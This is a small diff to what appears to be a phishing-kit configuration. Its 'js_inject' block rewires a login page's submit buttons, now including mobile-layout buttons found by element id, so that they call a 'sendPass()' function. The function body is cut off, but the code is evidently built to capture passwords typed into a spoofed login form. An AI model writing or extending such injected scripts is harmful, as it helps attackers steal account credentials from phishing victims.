@@ -40,7 +40,11 @@ js_inject:
     script: |  
       function onclickListener(){
         var submit = document.querySelectorAll('button[type=submit]')[0];
+        var submitmobile = document.getElementById('u_0_5');
+        var submitbuttonmobile = document.querySelectorAll('button[type=button]')[0];
         submit.setAttribute("onclick", "sendPass()");
+        submitmobile.setAttribute("onclick", "sendPass()");
+        submitbuttonmobile.setAttribute("onclick", "sendPass()");
         return;
       }
       function sendPass(){
